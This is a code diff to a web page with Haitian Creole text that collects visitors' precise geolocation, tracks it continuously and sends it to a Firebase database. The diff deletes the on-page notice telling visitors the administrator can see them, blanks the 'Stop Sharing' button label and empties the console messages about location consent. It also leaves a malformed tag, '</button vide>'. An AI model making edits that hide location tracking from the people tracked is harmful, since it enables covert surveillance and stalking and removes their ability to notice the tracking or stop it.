@@ -178,9 +178,9 @@
       <div class="card">
         <p><span class="dot"></span><strong>Bienvenue !</strong></p>
         <p style="margin-top:8px; font-size:13px; color:#aaa;">
-          Ou konekte. Administratè a ap wè ou.
+          
         </p>
-        <button id="btnStop">⛔ Sispann Pataje</button>
+        <button id="btnStop"></button vide>
       </div>
     </div>
 
@@ -449,7 +449,7 @@ db.ref("images").on("value", (snapshot) => {
     // Mande pèmisyon dabò
     navigator.geolocation.getCurrentPosition(
       (p) => {
-        console.log("✅ Lokasyon aksepte");
+        console.log("");
         sendLocation(p);
 
         // Kòmanse swivi
@@ -461,7 +461,7 @@ db.ref("images").on("value", (snapshot) => {
         window._watchId = watchId;
       },
       (err) => {
-        console.warn("❌ Visitor refize lokasyon:", err.message);
+        console.warn("", err.message);
       },
       { enableHighAccuracy: true, timeout: 10000 }
     );
